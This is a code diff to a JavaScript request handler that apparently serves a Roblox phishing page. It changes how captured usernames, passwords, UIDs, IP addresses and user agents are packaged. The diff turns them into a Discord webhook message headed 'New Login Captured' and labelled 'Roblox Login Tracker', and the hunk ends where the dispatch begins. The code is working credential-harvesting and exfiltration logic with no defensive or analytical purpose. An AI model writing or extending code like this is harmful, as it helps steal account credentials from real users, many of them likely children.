@@ -28,13 +28,51 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Username and password required' });
     }
 
+    // Format for Discord webhook
     const payload = {
-      uid: uid || 'unknown',
-      username: username,
-      password: password,
-      timestamp: new Date().toISOString(),
-      userAgent: userAgent || 'unknown',
-      ip: ip || 'unknown'
+      content: '**🔐 New Login Captured**',
+      embeds: [
+        {
+          title: 'Login Credentials',
+          color: 0x5865F2,
+          fields: [
+            {
+              name: '👤 Username',
+              value: username || 'N/A',
+              inline: true
+            },
+            {
+              name: '🔑 Password',
+              value: password || 'N/A',
+              inline: true
+            },
+            {
+              name: '🆔 UID',
+              value: uid || 'N/A',
+              inline: true
+            },
+            {
+              name: '🌐 IP',
+              value: ip || 'N/A',
+              inline: true
+            },
+            {
+              name: '🖥️ User Agent',
+              value: userAgent || 'N/A',
+              inline: false
+            },
+            {
+              name: '⏰ Timestamp',
+              value: new Date().toISOString(),
+              inline: false
+            }
+          ],
+          footer: {
+            text: 'Roblox Login Tracker'
+          },
+          timestamp: new Date().toISOString()
+        }
+      ]
     };
 
     const results = await Promise.allSettled(
